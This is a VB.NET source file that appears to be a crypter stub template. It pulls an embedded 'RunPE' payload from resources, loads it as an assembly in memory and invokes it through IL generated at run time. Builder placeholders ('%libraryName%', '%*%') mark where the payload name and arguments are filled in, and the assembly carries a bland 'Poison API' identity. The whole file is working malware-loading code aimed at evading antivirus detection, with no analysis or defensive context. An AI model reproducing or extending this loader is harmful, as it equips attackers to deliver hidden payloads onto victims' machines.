Option Explicit Off
Option Strict Off
Imports System, Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System.Reflection
Imports System.Text
Imports System.Security.Cryptography
Imports System.IO.Compression
Imports System.IO
Imports System.Runtime.InteropServices
Imports System.Runtime.CompilerServices
Imports System.Reflection.Emit
Imports System.Windows.Forms

<Assembly: AssemblyTitle("Poison API")>
<Assembly: AssemblyDescription("Poison API")>
<Assembly: AssemblyCompany("Poison API")>
'<Assembly: AssemblyProduct("PoisonScanner API")>
<Assembly: AssemblyCopyright("Copyright ©  2016")>


<Assembly: AssemblyVersion("1.0.0.0")>
<Assembly: AssemblyFileVersion("1.0.0.0")>

Namespace Intro
    Public Class ChapterOne

        Shared str As String = "%*%"

        Public Shared Sub Main()
            Invoke(retrieveRunPE, "Cls", "Mth", New Object() {str})
        End Sub

        Public Shared Function Invoke(ByVal input() As Byte, ByVal cls As String, ByVal procname As String, ByVal args() As Object) As Object
            Dim handler As New DynamicMethod("", GetType(Object), New [Type]() {GetType(Byte()), GetType(String), GetType(String), GetType(Object())})
            Dim IL As ILGenerator = handler.GetILGenerator

            Dim argsLoad() As Type = New [Type]() {GetType(Byte())}
            Dim mthLoad As MethodInfo = GetType(Assembly).GetMethod("Load", argsLoad)

            Dim argsGTYPE() As Type = New [Type]() {GetType(String)}
            Dim mthGTYPE As MethodInfo = GetType(Assembly).GetMethod("GetType", argsGTYPE)

            Dim argsActi() As Type = New [Type]() {GetType(Type)}
            Dim mthActi As MethodInfo = GetType(Activator).GetMethod("CreateInstance", argsActi)

            Dim argsGetVal() As Type = New [Type]() {GetType(Object)}
            Dim mthGetVal As MethodInfo = GetType(RuntimeHelpers).GetMethod("GetObjectValue", argsGetVal)

            Dim mthCallByName As MethodInfo = GetType(Versioned).GetMethod("CallByName")

            IL.Emit(OpCodes.Ldarg_0)
            IL.Emit(OpCodes.Call, mthLoad)
            IL.Emit(OpCodes.Ldarg_1)
            IL.EmitCall(OpCodes.Callvirt, mthGTYPE, Nothing)
            IL.Emit(OpCodes.Call, mthActi)
            IL.Emit(OpCodes.Call, mthGetVal)
            IL.Emit(OpCodes.Ldarg_2)
            IL.Emit(OpCodes.Ldc_I4_1)
            IL.Emit(OpCodes.Ldarg_3)
            IL.Emit(OpCodes.Call, mthCallByName)
            IL.Emit(OpCodes.Ret)
            Return CallByName(handler, "Invoke", CallType.Method, New Object() {handler, New Object() {input, cls, procname, args}})
        End Function

        Public Shared Function retrieveRunPE() As Byte()
            Dim resMan As New Resources.ResourceManager("2016", Assembly.GetEntryAssembly)
            Return resMan.GetObject("%libraryName%")
        End Function


    End Class

End Namespace